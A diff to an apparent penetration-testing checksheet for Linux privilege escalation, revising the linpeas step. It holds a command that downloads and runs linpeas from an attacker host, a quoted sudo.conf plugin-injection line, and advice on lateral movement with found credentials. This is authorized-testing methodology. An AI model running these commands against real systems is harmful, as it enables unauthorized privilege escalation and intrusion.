@@ -667,7 +667,7 @@ From the populated files, identify and record `<distro>` (e.g. Debian, Ubuntu, R
 
 ## Step 18 — Automated enumeration (linpeas)
 
-⚠️ Maximum IOC. Comprehensive backstop.
+⚠️ Maximum IOC. Backstop when Steps 0–17 fall through.
 
 ### Transfer:
 
@@ -675,21 +675,44 @@ On **attacker** (in the linpeas directory):
 
 `python3 -m http.server 8000`
 
-On target:
+On **target:**
 
-`wget http://<lhost>:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh`
+`wget http://<lhost>:8000/linpeas.sh -O /dev/shm/linpeas.sh && chmod +x /dev/shm/linpeas.sh`
 
 ### Run:
 
-`/tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas.out`
+`/dev/shm/linpeas.sh -a | tee /dev/shm/linpeas.out`
 
 ### Triage:
 
-Focus on red+yellow flagged findings. Route each finding back to the appropriate step above (sudo / SUID / cron / etc.) for exploitation.
+Disposition every finding into one of the four categories below.
+
+#### Category 1 — mapped to a Checksheet step (0–17)
+
+Finding corresponds to an earlier step's coverage (sudo / SUID / cron / etc.). Route to that step's exploitation path.
+
+If the step's check fell through but linpeas surfaces the finding, the step's enumeration has a gap OR the step's output was misread. Re-check the artefact directly (do not re-run the step blindly). Log any confirmed gap for post-engagement Checksheet work.
+
+#### Category 2 — narrow-applicability vector
+
+Vector logged in Step 16 (Narrow-applicability vectors). Route to the matching Step 16 sub-block.
+
+#### Category 3 — coverage gap
+
+Vector not covered by any Checksheet step. Attempt first-principles exploitation. Log the gap for future Checksheet coverage work.
+
+#### Category 4 — flagged-but-blocked with reasoning
+
+Linpeas surfaces the finding but first-principles verification shows the naive exploitation chain fails. Recognise, move on.
+
+##### Writable `/etc/sudo.conf`
+
+- **Plugin directive injection blocked.** Per `sudo_plugin(8)`: the shared object file must be owned by uid 0 and only writable by its owner. Attacker-owned `.so` triggers runtime `sudo: fatal error, unable to load plugins`. Naive `echo "Plugin sudoers_policy /tmp/attacker.so" >> /etc/sudo.conf; sudo --version` chain does not work; secondary sources (medium.com "linux-privesc-stop-looking-for-kernel-exploits", exploitnotes.org "sudo") are factually wrong on this.
+- **Path noexec / Path intercept redirection** — validation status uncertain across sudo versions. Sudo docs describe these directives without documenting whether target `.so` files are validated to the same standard as Plugin directive targets. If validated → blocked (same as Plugin). If not → potential LD_PRELOAD chain into sudo's child process. Not verified. Investigate per-target if encountered.
 
 ### Cleanup:
 
-`rm /tmp/linpeas.sh /tmp/linpeas.out`
+`rm /dev/shm/linpeas.sh /dev/shm/linpeas.out`
 
 ---
 
@@ -697,6 +720,5 @@ Focus on red+yellow flagged findings. Route each finding back to the appropriate
 
 All nineteen steps fall through:
 
-1. Re-review `linpeas.out` for less-common findings (kernel keyring, polkit, dbus, custom services).
-2. Deeper enum on app-specific artefacts: `/var/spool/`, `/var/backups/`, `/opt/`, `/srv/`.
-3. Reconsider scope — PrivEsc may require lateral movement first (login as another user via discovered SSH keys / passwords, then re-run this checksheet from that user's context).
+1. Deeper enum on app-specific artefacts: `/var/spool/`, `/var/backups/`, `/opt/`, `/srv/`.
+2. Reconsider scope — PrivEsc may require lateral movement first (login as another user via discovered SSH keys / passwords, then re-run this checksheet from that user's context).
